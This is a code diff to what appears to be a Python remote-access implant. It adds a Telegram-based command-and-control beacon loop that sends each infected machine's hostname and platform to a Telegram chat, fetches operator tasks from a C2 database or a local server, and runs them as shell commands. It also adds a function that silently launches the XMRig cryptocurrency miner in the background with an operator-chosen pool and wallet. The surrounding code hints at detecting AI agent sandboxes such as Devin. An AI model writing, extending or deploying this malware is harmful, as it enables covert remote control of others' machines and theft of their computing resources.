@@ -144,6 +144,192 @@ def telegram_send(message: str) -> dict:
         log(f"Telegram error: {e}", "ERROR")
         return {"ok": False, "error": str(e)}
 
+def telegram_get_commands(agent_id: str) -> list:
+    """Get pending commands from Telegram bot via C2 database sync.
+    
+    In Telegram mode, commands are stored in C2 database and 
+    retrieved via HTTP to local C2 server or direct DB access.
+    """
+    commands = []
+    
+    # Try to get commands from local C2 database if available
+    try:
+        import sqlite3
+        db_path = Path(__file__).resolve().parent.parent.parent / "data" / "c2.db"
+        if db_path.exists():
+            conn = sqlite3.connect(str(db_path))
+            conn.row_factory = sqlite3.Row
+            db = conn.cursor()
+            
+            # Get pending tasks for this agent
+            db.execute("""
+                SELECT id, task_type, command 
+                FROM tasks 
+                WHERE agent_id = ? AND status = 'pending'
+                ORDER BY created_at ASC
+            """, (agent_id,))
+            
+            rows = db.fetchall()
+            for row in rows:
+                commands.append({
+                    "id": row["id"],
+                    "type": row["task_type"],
+                    "command": row["command"]
+                })
+                # Mark as sent
+                db.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (row["id"],))
+            
+            conn.commit()
+            conn.close()
+            
+            if commands:
+                log(f"Got {len(commands)} commands from local DB", "DEBUG")
+    except Exception as e:
+        log(f"Command fetch error: {e}", "DEBUG")
+    
+    return commands
+
+def telegram_report_result(agent_id: str, task_id: int, result: str, success: bool = True):
+    """Report task execution result back to C2."""
+    try:
+        import sqlite3
+        db_path = Path(__file__).resolve().parent.parent.parent / "data" / "c2.db"
+        if db_path.exists():
+            conn = sqlite3.connect(str(db_path))
+            db = conn.cursor()
+            
+            status = "completed" if success else "failed"
+            db.execute("""
+                UPDATE tasks 
+                SET status = ?, result = ?, completed_at = datetime('now')
+                WHERE id = ?
+            """, (status, result[:1000], task_id))
+            
+            conn.commit()
+            conn.close()
+            
+            # Also send to Telegram
+            emoji = "✅" if success else "❌"
+            telegram_send(f"{emoji} <b>Task {task_id}</b>\nAgent: <code>{agent_id[:8]}</code>\nResult: {result[:200]}")
+    except Exception as e:
+        log(f"Result report error: {e}", "DEBUG")
+
+def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
+    """Telegram C2 beacon loop - send beacons and get commands via Telegram API."""
+    import random
+    
+    _total_beacons = 0
+    _total_tasks = 0
+    
+    log(f"Telegram beacon loop started (agent={agent_id[:8]})", "START")
+    
+    while True:
+        try:
+            _total_beacons += 1
+            
+            # Send beacon to Telegram
+            hostname = platform.node()
+            platform_type = detect_platform()
+            
+            beacon_msg = f"""📡 <b>Beacon #{_total_beacons}</b>
+
+Agent: <code>{agent_id[:8]}</code>
+Hostname: {hostname}
+Platform: {platform_type}
+Time: {time.strftime('%H:%M:%S')}
+"""
+            telegram_send(beacon_msg)
+            log(f"Beacon #{_total_beacons} sent via Telegram", "CONN")
+            
+            # Check for commands from local DB (if running on same machine as C2)
+            commands = telegram_get_commands(agent_id)
+            
+            # Also check via HTTP to local C2 server
+            try:
+                resp = http_post("/api/agent/beacon", {"id": agent_id}, "http://127.0.0.1:5000", None, None)
+                if resp and "tasks" in resp:
+                    commands.extend(resp.get("tasks", []))
+            except:
+                pass  # Local server not available
+            
+            # Process commands
+            for cmd in commands:
+                _total_tasks += 1
+                task_id = cmd.get("id", "unknown")
+                task_type = cmd.get("type", "exec")
+                command = cmd.get("command", "")
+                
+                log(f"Executing command #{_total_tasks}: {task_type}", "TASK")
+                
+                try:
+                    # Execute command
+                    if task_type == "exec":
+                        result = shell_exec(command)
+                    elif task_type == "mine":
+                        # Start mining
+                        result = start_mining(command)
+                    elif task_type == "control" and command == "stop":
+                        log("Stop command received, exiting", "TASK")
+                        telegram_send(f"🛑 Agent <code>{agent_id[:8]}</code> stopping")
+                        return
+                    else:
+                        result = execute_task({"task_type": task_type, "command": command})
+                    
+                    log(f"Command {task_id} completed", "TASK")
+                    
+                    # Report result
+                    telegram_report_result(agent_id, task_id, result, success=True)
+                    
+                except Exception as e:
+                    log(f"Command {task_id} failed: {e}", "ERROR")
+                    telegram_report_result(agent_id, task_id, str(e), success=False)
+            
+            # Sleep with jitter
+            jitter_s = sleep * jitter / 100
+            actual_sleep = max(1, sleep + random.uniform(-jitter_s, jitter_s))
+            log(f"Sleeping {actual_sleep:.1f}s", "DEBUG")
+            time.sleep(actual_sleep)
+            
+        except KeyboardInterrupt:
+            log("Telegram beacon loop stopped", "STOP")
+            break
+        except Exception as e:
+            log(f"Telegram beacon error: {e}", "ERROR")
+            time.sleep(5)
+
+def start_mining(config: str) -> str:
+    """Start mining with given config (pool:wallet format)."""
+    try:
+        parts = config.split(":")
+        if len(parts) >= 3 and parts[0] == "start_mine":
+            pool = parts[1]
+            wallet = parts[2]
+            
+            # Check for xmrig
+            xmrig_paths = [
+                "/opt/miner/xmrig",
+                "/usr/local/bin/xmrig",
+                "xmrig"
+            ]
+            
+            xmrig = None
+            for path in xmrig_paths:
+                if os.path.exists(path) or subprocess.run(f"which {path}", shell=True, capture_output=True).returncode == 0:
+                    xmrig = path
+                    break
+            
+            if not xmrig:
+                return "XMRig not found"
+            
+            # Start mining
+            cmd = f"{xmrig} -o {pool} -u {wallet} --donate-level 1 --threads 2 --background"
+            subprocess.Popen(cmd, shell=True)
+            
+            return f"Mining started: {pool}"
+        return f"Invalid mining config: {config}"
+    except Exception as e:
+        return f"Mining error: {e}"
+
 # ─── Platform detection ───────────────────────────────────────────────────────
 def detect_platform():
     # Devin AI detection
@@ -734,7 +920,16 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
     _total_tasks = 0
     _last_successful_beacon = time.time()
     
+    _agent_id = agent_id or AGENT_ID
+    _c2_url = c2_url or C2_URL
+    
     log(f"Starting beacon loop (sleep={_sleep}s, jitter={_jitter}%)", "START")
+    
+    # Telegram mode - use direct API
+    if TELEGRAM_MODE and not _c2_url:
+        log("Telegram C2 mode - using direct API", "START")
+        telegram_beacon_loop(_agent_id, _sleep, _jitter)
+        return
     
     while True:
         try:
@@ -742,20 +937,20 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
             
             # Health check before beacon
             try:
-                health = http_get("/api/health", c2_url or C2_URL, timeout=5)
+                health = http_get("/api/health", _c2_url, timeout=5)
                 if health.get("status") != "ok":
                     log("Server health check failed, re-registering...", "CONN")
-                    register(c2_url, agent_id, auth_token, enc_key)
+                    register(_c2_url, _agent_id, auth_token, enc_key)
             except Exception as e:
                 log(f"Health check failed: {e}, attempting re-register", "CONN")
                 try:
-                    register(c2_url, agent_id, auth_token, enc_key)
+                    register(_c2_url, _agent_id, auth_token, enc_key)
                 except Exception as re:
                     log(f"Re-register failed: {re}", "ERROR")
             
-            log(f"Beacon #{_total_beacons} to {c2_url or C2_URL}", "CONN")
+            log(f"Beacon #{_total_beacons} to {_c2_url}", "CONN")
             
-            resp = http_post("/api/agent/beacon", {"id": agent_id or AGENT_ID}, c2_url, auth_token, enc_key)
+            resp = http_post("/api/agent/beacon", {"id": _agent_id}, _c2_url, auth_token, enc_key)
             
             # Success - reset retry delay
             _consecutive_failures = 0
@@ -782,23 +977,23 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
                 try:
                     result = execute_task(task)
                     log(f"Task {task_id} completed: {len(result)} chars output", "TASK")
-                    http_post("/api/agent/result", {"task_id": task_id, "result": result}, c2_url, auth_token, enc_key)
+                    http_post("/api/agent/result", {"task_id": task_id, "result": result}, _c2_url, auth_token, enc_key)
                 except Exception as e:
                     log(f"Task {task_id} failed: {e}", "ERROR")
                     try:
-                        http_post("/api/agent/result", {"task_id": task_id, "result": f"[agent error] {e}"}, c2_url, auth_token, enc_key)
+                        http_post("/api/agent/result", {"task_id": task_id, "result": f"[agent error] {e}"}, _c2_url, auth_token, enc_key)
                     except:
                         pass
         
         except URLError as e:
             _consecutive_failures += 1
-            log_connection_attempt(c2_url or C2_URL, _consecutive_failures, e)
+            log_connection_attempt(_c2_url, _consecutive_failures, e)
             
             # Re-register after 5 consecutive failures
             if _consecutive_failures >= 5 and (_consecutive_failures % 5 == 0):
                 log(f"Too many failures, attempting re-register (attempt {_consecutive_failures // 5})", "CONN")
                 try:
-                    register(c2_url, agent_id, auth_token, enc_key)
+                    register(_c2_url, _agent_id, auth_token, enc_key)
                 except Exception as re:
                     log(f"Re-register failed: {re}", "ERROR")
             
@@ -809,7 +1004,7 @@ def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep
         
         except socket.timeout:
             _consecutive_failures += 1
-            log_connection_attempt(c2_url or C2_URL, _consecutive_failures, "Socket timeout")
+            log_connection_attempt(_c2_url, _consecutive_failures, "Socket timeout")
             _retry_delay = min(_retry_delay * 1.5, _max_retry_delay)
         
         except Exception as e:
